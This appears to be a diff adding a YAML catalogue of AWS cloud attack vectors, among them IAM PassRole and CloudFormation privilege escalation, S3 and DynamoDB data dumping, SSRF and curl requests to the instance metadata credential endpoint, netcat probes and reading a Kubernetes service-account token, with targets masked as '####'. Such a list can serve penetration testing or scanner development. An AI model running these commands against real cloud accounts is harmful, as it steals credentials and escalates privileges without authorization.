@@ -1,0 +1,97 @@
+
+
+iam_passrole_ec2_privesc:
+  vector: "iam:PassRole + ec2:RunInstances"
+  intent: "Launch EC2 using a privileged role"
+  role_arn: "arn:aws:iam:::role/####"
+  http_request:
+    method: POST
+    url: "https://ec2.####.amazonaws.com"
+    body: "Action=RunInstances&ImageId=####&IamInstanceProfile.Arn=####"
+
+sts_assumerole_chain:
+  vector: "Misconfigured trust relationship"
+  payload:
+    role_arn: "arn:aws:iam:::role/####"
+    external_id: "####"
+  grpc_request: "{ 'RoleArn': '####', 'RoleSessionName': 'x' }"
+
+
+
+s3_public_upload:
+  vector: "Public-write ACL"
+  bucket: "####"
+  payload: "PUT malicious.txt"
+  http_example: |
+    PUT /malicious.txt HTTP/1.1
+    Host: ####.s3.amazonaws.com
+  object_body: "####MASKED####"
+
+s3_enumeration_leak:
+  vector: "ListBucket + GetObject"
+  bucket: "####"
+  cli_commands:
+    - "aws s3 ls s3://####"
+    - "aws s3 cp s3://####/secret.txt ./"
+
+
+imdsv1_credential_harvest:
+  vector: "IMDSv1 enabled / No tokens"
+  http_example: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/####"
+  payload: "####"
+
+sg_ingress_attack_surface:
+  vector: "0.0.0.0/0 inbound"
+  target_port: "####"
+  payload: "nc #### ####"
+
+
+
+lambda_escalation:
+  vector: "Wildcard IAM privileges in Lambda role"
+  python_poc: |
+    import boto3
+    client = boto3.client('iam')
+    print(client.list_users())
+  masked: true
+
+lambda_env_exfil:
+  vector: "Secrets in environment variables"
+  env_var: "####_SECRET"
+  payload: "print(os.getenv('####_SECRET'))"
+
+
+
+nosql_injection:
+  vector: "Unsanitized DynamoDB filter expression"
+  payload: "{ 'FilterExpression': 'id = :####' }"
+
+dynamodb_dump:
+  vector: "Over‑permissive dynamodb:* permissions"
+  cli: "aws dynamodb scan --table-name ####"
+
+
+
+ssrf_to_metadata:
+  vector: "Backend fetch SSRF"
+  payload: "http://169.254.169.254/latest/meta-data/####"
+
+alb_internal_access:
+  vector: "Internal ALB exposed publicly"
+  http_test: "curl http://####-internal-####.elb.amazonaws.com"
+
+
+
+cfn_privesc:
+  vector: "CloudFormation allowed to create IAM roles"
+  template_snippet: "<AWS::IAM::Role>####</AWS::IAM::Role>"
+
+
+
+eks_node_metadata:
+  vector: "Access to Node IMDS endpoint"
+  payload: "curl 169.254.169.254/latest/meta-data/iam/security-credentials/####"
+
+eks_sa_token_abuse:
+  vector: "Over‑privileged Kubernetes Service Account"
+  command: "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
